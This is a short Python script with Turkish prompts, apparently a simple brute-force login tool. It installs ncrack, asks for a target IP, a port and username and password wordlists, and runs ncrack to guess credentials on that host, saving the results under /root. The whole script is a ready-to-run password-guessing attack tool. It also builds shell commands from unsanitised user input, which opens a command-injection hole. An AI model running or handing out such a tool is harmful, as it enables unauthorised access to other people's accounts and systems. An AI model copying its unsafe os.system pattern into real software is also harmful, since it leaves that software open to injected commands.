import os

def isIp(hedef_ip):
    global flag
    flag = False

    for i in hedef_ip:
        if (i=="1" or i=="2" or i=="3" or i=="4" or i=="5" or i=="6" or i=="7" or i=="8" or i=="9" or i=="0" or i=="."):
            flag = True
        else:
            flag = False
            break

os.system("apt-get install ncrack")
os.system("apt-get install figlet")
os.system("clear")

os.system("figlet BRUTE FORCE")

hedef_ip = input("Hedef Ip Girin : ")
isIp(hedef_ip)
port = input("Hedef Port Girin : ")
kullanici = input("Kullanıcı Wordlist Girin : ")
sifre = input("Şifre Wordlist Girin : ")

if (flag):
    os.system("ncrack -p "+port+" -U "+kullanici+" -P "+sifre+" "+hedef_ip+ ">> "+"/root/ncrack_"+hedef_ip+".txt")
    os.system("cat /root/ncrack_"+hedef_ip+".txt")
    print("\nKayıt Edildi /root/ncrack_"+hedef_ip+".txt")
else:
    print("\33[93mHATA")



